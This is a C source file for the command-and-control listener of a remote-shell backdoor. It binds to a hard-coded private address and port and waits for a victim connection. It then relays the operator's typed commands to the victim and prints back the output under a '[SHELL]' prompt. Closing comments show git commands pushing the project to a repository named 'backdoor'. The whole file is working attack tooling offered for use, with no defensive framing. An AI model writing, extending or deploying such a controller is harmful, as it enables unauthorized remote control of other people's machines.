#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netinet/in.h>



int main()
{
int ServPort = 50005;
	char *ServIp = "192.168.1.38";
// printf("[+] - Starting Server On Port -> %d", ServPort);

    int sock, client_socket;
    char buffer[1024];
    char response[18384];
    struct sockaddr_in server_address, client_address;
    int i = 0;
    int optval = 1;

	

    socklen_t client_length;

    sock = socket(AF_INET, SOCK_STREAM, 0); 
    

    if (setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(optval)) < 0)
    {
        printf("[ERR] - Error Setting TCP Sockte Options!\n");
        return 1;
    }

    server_address.sin_family = AF_INET;
    server_address.sin_addr.s_addr = inet_addr(ServIp);
    server_address.sin_port = htons(ServPort);

    bind(sock, (struct sockaddr *)&server_address, sizeof(server_address));
    listen(sock, 5);

    client_length = sizeof(client_address);
    client_socket = accept(sock, (struct sockaddr *)&client_address, &client_length);

    while (1)
    {
    jumb:
        bzero(&buffer, sizeof(buffer));
        bzero(&response, sizeof(response));

        printf("[SHELL] ─ #%s~$ ", inet_ntoa(client_address.sin_addr));

        fgets(buffer, sizeof(buffer), stdin);

        strtok(buffer, "\n");

        write(client_socket, buffer, sizeof(buffer));

        if (strncmp("q", buffer, 1) == 0)
        {
            break;
        }
 
        else
        {
            recv(client_socket, response, sizeof(response), MSG_WAITALL);
            printf("%s", response);
        }
    }
}

// echo "# backdoor" >> README.md
// git init
// git add README.md
// git commit -m "first commit"
// git branch -M main
// git remote add origin https://github.com/s3q/backdoor.git
// git push -u origin main